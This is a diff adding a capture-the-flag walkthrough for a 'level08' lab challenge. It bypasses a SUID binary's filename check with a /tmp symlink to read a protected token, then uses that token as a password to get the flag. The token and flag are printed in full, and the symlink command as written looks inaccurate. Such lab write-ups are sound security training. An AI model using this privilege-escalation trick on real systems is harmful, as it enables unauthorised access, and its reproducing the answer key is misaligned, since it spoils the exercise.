@@ -1,0 +1,48 @@
+ls -la
+ -rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
+ -rw-------  1 flag08  flag08    26 Mar  5  2016 token
+
+again an SUID script, and a token file
+
+cat token
+ cat: token: Permission denied
+
+./level08 
+ ./level08 [file to read]
+
+./level08 token
+ You may not access 'token'
+
+echo "abc" > /tmp/test
+./level08 /tmp/test
+ abc
+
+so it seems the script reads the file
+it should be able to read token since it has the perms
+
+strings level08
+ %s [file to read]
+ token
+ You may not access '%s' <== THERE
+ Unable to open %s
+ Unable to read fd %d
+ ;*2$"
+
+looks like it stores the name of the file to read and refuses to read it if it's named "token"
+
+./level08 ~/token
+ You may not access '/home/user/level08/token'
+
+or if it contains token
+again we're not allowed write access but we can make a symlink of token in /tmp :
+
+ln -s token /tmp/smth
+
+./level08 /tmp/smth
+ quif5eloekouj29ke0vouxean
+
+su flag08
+ password: quif5eloekouj29ke0vouxean
+
+getflag
+ Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
